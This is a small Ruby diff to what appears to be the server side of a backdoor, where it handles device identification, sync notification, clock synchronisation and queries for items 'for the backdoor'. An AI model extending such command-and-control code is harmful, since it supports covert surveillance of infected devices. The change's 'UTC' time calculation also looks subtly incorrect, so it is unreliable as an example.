@@ -53,14 +53,17 @@ module Commands
 
     trace :info, "[#{peer}][#{session[:cookie]}] Identification: #{version} '#{user_id}' '#{device_id}' '#{source_id}'"
 
+    # get the time in UTC
+    now = Time.now - Time.now.utc_offset
+
     # notify the pusher that the sync is in progress    
-    Pusher.instance.sync_for session, version, user_id, device_id, source_id, Time.now
+    Pusher.instance.sync_for session, version, user_id, device_id, source_id, now
 
     # response to the request
     command = [PROTO_OK].pack('i')
 
     # the time of the server to synchronize the clocks
-    time = [Time.new.to_i].pack('q')
+    time = [now.to_i].pack('q')
 
     available = ""
     # ask to the db if there are any availables for the backdoor
